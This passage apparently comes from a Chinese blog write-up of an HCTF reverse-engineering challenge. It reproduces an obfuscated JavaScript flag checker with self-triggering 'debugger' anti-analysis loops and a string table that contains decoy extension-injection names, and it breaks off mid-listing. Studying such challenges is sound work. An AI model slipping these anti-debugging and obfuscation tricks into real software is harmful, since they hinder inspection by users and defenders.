_0x3ea581=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x2fbf7a=<span class="number">0x0</span>;_0x2fbf7a&lt;_0x4c466e[_0x43c8d1(<span class="number">0x8</span>)];_0x2fbf7a++)&#123;_0x3ea581+=_0x28871(_0x4c466e[_0x2fbf7a]);&#125;<span class="keyword">return</span> _0x3ea581;&#125;;j=_0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);<span class="keyword">if</span>(j[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)]!=j[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)]||(_0x1c3854(j[<span class="number">0x0</span>])^_0x1c3854(j[<span class="number">0x1</span>]))!=<span class="number">0x1613</span>)&#123;<span class="keyword">return</span>![];&#125;k=<span class="function"><span class="params">_0xffcc52</span>=&gt;</span>_0xffcc52[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]()*_0x76e1e8[<span class="number">0x1</span>][_0x43c8d1(<span class="number">0x8</span>)];l=h(j[<span class="number">0x0</span>],k);<span class="keyword">if</span>(l!=<span class="number">0x2f9b5072</span>)&#123;<span class="keyword">return</span>![];&#125;m=_0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x0</span>,<span class="number">0x4</span>))<span class="number">-0x48a05362</span>==n%l;<span class="function"><span class="keyword">function</span> <span class="title">_0x5a6d56</span>(<span class="params">_0x5a25ab,_0x4a4483</span>)</span>&#123;<span class="keyword">var</span> _0x55b09f=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x508ace=<span class="number">0x0</span>;_0x508ace&lt;_0x4a4483;_0x508ace++)&#123;_0x55b09f+=_0x5a25ab;&#125;<span class="keyword">return</span> _0x55b09f;&#125;<span class="keyword">if</span>(!m||_0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x5</span>,<span class="number">0x1</span>),<span class="number">0x2</span>)==_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x5</span>,<span class="number">0x4</span>)||_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>,<span class="number">0x1</span>)-_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)!=<span class="number">0x1</span>)&#123;<span class="keyword">return</span>![];&#125;o=_0x1c3854(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x2</span>))[_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x2</span>)==_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x1</span>)[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)]()*_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0x8</span>)]*<span class="number">0x5</span>;<span class="keyword">return</span> o&amp;&amp;_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>,<span class="number">0x1</span>)==<span class="number">0x2</span>&amp;&amp;_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x6</span>,<span class="number">0x2</span>)==_0x5a6d56(_0x76e1e8[<span class="number">0x4</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x7</span>,<span class="number">0x1</span>),<span class="number">0x2</span>);&#125;<span class="keyword">catch</span>(_0x4cbb89)&#123;<span class="built_in">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="string">&#x27;gg&#x27;</span>);<span class="keyword">return</span>![];&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0x5bf136=<span class="built_in">document</span>[_0xa180(<span class="string">&#x27;0x32&#x27;</span>)](_0xa180(<span class="string">&#x27;0x33&#x27;</span>))[<span class="string">&#x27;value&#x27;</span>];<span class="keyword">if</span>(_0x5bf136==<span class="string">&#x27;&#x27;</span>)&#123;<span class="built_in">console</span>[_0xa180(<span class="string">&#x27;0x34&#x27;</span>)](_0xa180(<span class="string">&#x27;0x35&#x27;</span>));<span class="keyword">return</span>![];&#125;<span class="keyword">var</span> _0x4d0e29=check(_0x5bf136);<span class="keyword">if</span>(_0x4d0e29)&#123;alert(_0xa180(<span class="string">&#x27;0x36&#x27;</span>));&#125;<span class="keyword">else</span>&#123;alert(_0xa180(<span class="string">&#x27;0x37&#x27;</span>));&#125;&#125;<span class="built_in">window</span>[<span class="string">&#x27;onload&#x27;</span>]=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(_0xa180(<span class="string">&#x27;0x38&#x27;</span>),<span class="number">0x32</span>);test();&#125;;</span><br></pre></td></tr></table></figure>

<p>美化一下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a = [<span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;fromCharCode&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>, <span class="string">&#x27;substr&#x27;</span>, <span class="string">&#x27;\x5cw+&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>, <span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;getElementById&#x27;</span>, <span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>, <span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>, <span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>, <span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>, <span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;substring&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, <span class="string">&#x27;Function&#x27;</span>, <span class="string">&#x27;charAt&#x27;</span>, <span class="string">&#x27;idle&#x27;</span>, <span class="string">&#x27;pyW5F1U43VI&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;https://the-extension.com&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;storage&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;getTime&#x27;</span>, <span class="string">&#x27;setUTCHours&#x27;</span>, <span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;loading&#x27;</span>, <span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;removeListener&#x27;</span>, <span class="string">&#x27;onUpdated&#x27;</span>, <span class="string">&#x27;callee&#x27;</span>, <span class="string">&#x27;addListener&#x27;</span>, <span class="string">&#x27;onMessage&#x27;</span>, <span class="string">&#x27;runtime&#x27;</span>, <span class="string">&#x27;executeScript&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;Url\x20error&#x27;</span>, <span class="string">&#x27;query&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;active&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0xd4b7d6, _0xad25ab</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e3956 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x1661d3</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    _0x5e3956(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, <span class="number">0x1a2</span>));</span><br><span class="line"><span class="keyword">var</span> _0xa180 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5c351c, _0x2046d8</span>) </span>&#123;</span><br><span class="line">    _0x5c351c = _0x5c351c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> _0x26f3b3 = _0x180a[_0x5c351c];</span><br><span class="line">    <span class="keyword">return</span> _0x26f3b3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">_0x5b7c0c</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x2e2f8d = [<span class="string">&#x27;code&#x27;</span>, _0xa180(<span class="string">&#x27;0x0&#x27;</span>), _0xa180(<span class="string">&#x27;0x1&#x27;</span>), _0xa180(<span class="string">&#x27;0x2&#x27;</span>), <span class="string">&#x27;invalidMonetizationCode&#x27;</span>, _0xa180(<span class="string">&#x27;0x3&#x27;</span>), _0xa180(<span class="string">&#x27;0x4&#x27;</span>), _0xa180(<span class="string">&#x27;0x5&#x27;</span>), _0xa180(<span class="string">&#x27;0x6&#x27;</span>), _0xa180(<span class="string">&#x27;0x7&#x27;</span>), _0xa180(<span class="string">&#x27;0x8&#x27;</span>), _0xa180(<span class="string">&#x27;0x9&#x27;</span>), _0xa180(<span class="string">&#x27;0xa&#x27;</span>), _0xa180(<span class="string">&#x27;0xb&#x27;</span>), _0xa180(<span class="string">&#x27;0xc&#x27;</span>), _0xa180(<span class="string">&#x27;0xd&#x27;</span>), _0xa180(<span class="string">&#x27;0xe&#x27;</span>), _0xa180(<span class="string">&#x27;0xf&#x27;</span>), _0xa180(<span class="string">&#x27;0x10&#x27;</span>), _0xa180(<span class="string">&#x27;0x11&#x27;</span>), <span class="string">&#x27;url&#x27;</span>, _0xa180(<span class="string">&#x27;0x12&#x27;</span>), _0xa180(<span class="string">&#x27;0x13&#x27;</span>), _0xa180(<span class="string">&#x27;0x14&#x27;</span>), _0xa180(<span class="string">&#x27;0x15&#x27;</span>), _0xa180(<span class="string">&#x27;0x16&#x27;</span>), _0xa180(<span class="string">&#x27;0x17&#x27;</span>), _0xa180(<span class="string">&#x27;0x18&#x27;</span>), <span class="string">&#x27;tabs&#x27;</span>, _0xa180(<span class="string">&#x27;0x19&#x27;</span>), _0xa180(<span class="string">&#x27;0x1a&#x27;</span>), _0xa180(<span class="string">&#x27;0x1b&#x27;</span>), _0xa180(<span class="string">&#x27;0x1c&#x27;</span>), _0xa180(<span class="string">&#x27;0x1d&#x27;</span>), <span class="string">&#x27;replace&#x27;</span>, _0xa180(<span class="string">&#x27;0x1e&#x27;</span>), _0xa180(<span class="string">&#x27;0x1f&#x27;</span>), <span class="string">&#x27;includes&#x27;</span>, _0xa180(<span class="string">&#x27;0x20&#x27;</span>), <span class="string">&#x27;length&#x27;</span>, _0xa180(<span class="string">&#x27;0x21&#x27;</span>), _0xa180(<span class="string">&#x27;0x22&#x27;</span>), _0xa180(<span class="string">&#x27;0x23&#x27;</span>), _0xa180(<span class="string">&#x27;0x24&#x27;</span>), _0xa180(<span class="string">&#x27;0x25&#x27;</span>), _0xa180(<span class="string">&#x27;0x26&#x27;</span>), _0xa180(<span class="string">&#x27;0x27&#x27;</span>), _0xa180(<span class="string">&#x27;0x28&#x27;</span>), _0xa180(<span class="string">&#x27;0x29&#x27;</span>), <span class="string">&#x27;toString&#x27;</span>, _0xa180(<span class="string">&#x27;0x2a&#x27;</span>), <span class="string">&#x27;split&#x27;</span>];</span><br><span class="line">        <span class="keyword">var</span> _0x50559f = _0x5b7c0c[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>, <span class="number">0x4</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x5cea12 = <span class="built_in">parseInt</span>(btoa(_0x50559f), <span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span> (<span class="params">_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2</span>) </span>&#123;</span><br><span class="line">            _0x2d59cf = <span class="function"><span class="keyword">function</span> (<span class="params">_0x4be75f</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> _0x4be75f[<span class="string">&#x27;toString&#x27;</span>](_0x177f13);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&#x27;&#x27;</span> [<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/^/</span>, <span class="built_in">String</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);</span><br><span class="line">                _0x802d91 = [</span><br><span class="line">                    <span class="function"><span class="keyword">function</span> (<span class="params">_0x5e8f1a</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> _0x2829f2[_0x5e8f1a];</span><br><span class="line">                    &#125;</span><br><span class="line">                ];</span><br><span class="line">                _0x2d59cf = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> _0xa180(<span class="string">&#x27;0x2b&#x27;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                _0x46da6f = <span class="number">0x1</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">while</span> (_0x46da6f--)</span><br><span class="line">                <span class="keyword">if</span> (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180(<span class="string">&#x27;0x2c&#x27;</span>)](<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;\x5cb&#x27;</span> + _0x2d59cf(_0x46da6f) + <span class="string">&#x27;\x5cb&#x27;</span>, <span class="string">&#x27;g&#x27;</span>), _0x802d91[_0x46da6f]);</span><br><span class="line">            <span class="keyword">return</span> _0x200db2;</span><br><span class="line">        &#125;(_0xa180(<span class="string">&#x27;0x2d&#x27;</span>), <span class="number">0x11</span>, <span class="number">0x11</span>, _0xa180(<span class="string">&#x27;0x2e&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>), <span class="number">0x0</span>, &#123;&#125;));</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params">_0x3291b7, _0xced890</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0xaed809 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3aba26</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (--_0x3aba26) &#123;</span><br><span class="line">                    _0x3291b7[_0xa180(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            _0xaed809(++_0xced890);</span><br><span class="line">        &#125;(_0x2e2f8d, _0x5cea12 % <span class="number">0x7b</span>));</span><br><span class="line">        <span class="keyword">var</span> _0x43c8d1 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3120e0</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3120e0 = <span class="built_in">parseInt</span>(_0x3120e0, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x3a882f = _0x2e2f8d[_0x3120e0];</span><br><span class="line">            <span class="keyword">return</span> _0x3a882f;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x1c3854 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x52ba71</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x52b956 = <span class="string">&#x27;0x&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x59c050 = <span class="number">0x0</span>; _0x59c050 &lt; _0x52ba71[_0x43c8d1(<span class="number">0x8</span>)]; _0x59c050++) &#123;</span><br><span class="line">                _0x52b956 += _0x52ba71[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x59c050)[_0x43c8d1(<span class="number">0xc</span>)](<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x52b956;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x76e1e8 = _0x5b7c0c[_0x43c8d1(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x34f55b = (_0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">-0x2</span>, <span class="number">0x2</span>)) ^ _0x1c3854(_0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>))) % _0x76e1e8[<span class="number">0x0</span>][_0x43c8d1(<span class="number">0x8</span>)] == <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">if</span> (!_0x34f55b) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        b2c = <span class="function"><span class="keyword">function</span> (<span class="params">_0x3f9bc5</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3c3bd8 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> _0x4dc510 = [];</span><br><span class="line">            <span class="keyword">var</span> _0x4a199f = <span class="built_in">Math</span>[_0xa180(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] / <span class="number">0x5</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x4ee491 = _0x3f9bc5[_0x43c8d1(<span class="number">0x8</span>)] % <span class="number">0x5</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 != <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> _0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; <span class="number">0x5</span> - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &gt;&gt; <span class="number">0x3</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">0x2</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &gt;&gt; <span class="number">0x6</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x3f</span>) &gt;&gt; <span class="number">0x1</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">0x4</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &gt;&gt; <span class="number">0x4</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0x1</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &gt;&gt; <span class="number">0x7</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x7f</span>) &gt;&gt; <span class="number">0x2</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">0x3</span> | _0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &gt;&gt; <span class="number">0x5</span>));</span><br><span class="line">                _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[_0x43c8d1(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[_0x43c8d1(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &amp; <span class="number">0x1f</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> _0x545c12 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x1</span>) _0x545c12 = <span class="number">0x6</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x2</span>) _0x545c12 = <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x3</span>) _0x545c12 = <span class="number">0x3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x4</span>) _0x545c12 = <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0xa180(<span class="string">&#x27;0x2f&#x27;</span>)]();</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0x43c8d1(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                (<span class="function"><span class="keyword">function</span> <span class="title">_0x3c3bd8</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        (<span class="function"><span class="keyword">function</span> <span class="title">_0x4dc510</span>(<span class="params">_0x460a91</span>) </span>&#123;</span><br><span class="line">                            <span class="keyword">if</span> ((<span class="string">&#x27;&#x27;</span> + _0x460a91 / _0x460a91)[_0xa180(<span class="string">&#x27;0x30&#x27;</span>)] !== <span class="number">0x1</span> || _0x460a91 % <span class="number">0x14</span> === <span class="number">0x0</span>) &#123;</span><br><span class="line">                                (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">debugger</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            _0x4dc510(++_0x460a91);</span><br><span class="line">                        &#125;(<span 